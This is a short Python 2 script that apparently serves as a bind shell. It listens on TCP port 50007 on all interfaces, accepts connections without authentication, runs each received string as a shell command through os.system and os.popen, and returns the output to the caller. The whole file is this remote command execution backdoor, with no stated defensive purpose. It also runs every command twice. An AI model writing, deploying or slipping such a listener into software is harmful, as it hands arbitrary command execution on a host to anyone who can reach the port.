
import os
import socket


HOST = ''
PORT = 50007
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen(4)


while 1:
	conn, addr = s.accept()
	print 'Connected by', addr

	while 1:
		data = conn.recv(1024)
		if not data: break
		print "command received from:", addr, data
		os.system(data)
		cmd_result = os.popen(data).read()
		conn.sendall(cmd_result)
conn.close()

